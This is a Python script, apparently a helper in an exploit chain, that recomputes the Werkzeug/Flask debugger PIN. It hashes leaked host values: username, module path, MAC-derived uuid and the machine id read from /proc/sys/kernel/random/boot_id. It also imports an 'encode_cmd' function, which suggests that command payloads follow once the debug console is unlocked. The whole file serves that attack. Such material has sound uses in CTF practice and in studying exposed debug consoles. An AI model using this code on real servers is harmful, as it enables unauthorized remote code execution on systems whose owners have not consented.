from encoder import encode_cmd

import hashlib
from itertools import chain

def get_pin_code(username, modname, appname, dirname, uuid, machine_id):

    probably_public_bits = [
        username,   #'nobody',
        modname,    #'flask.app',
        appname,    #'Flask',
        dirname     #'/usr/local/lib/python3.10/site-packages/flask/app.py'
    ]

    private_bits = [
        uuid,       # int(mac_addr, 16)
        machine_id  # /proc/sys/kernel/random/boot_id
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv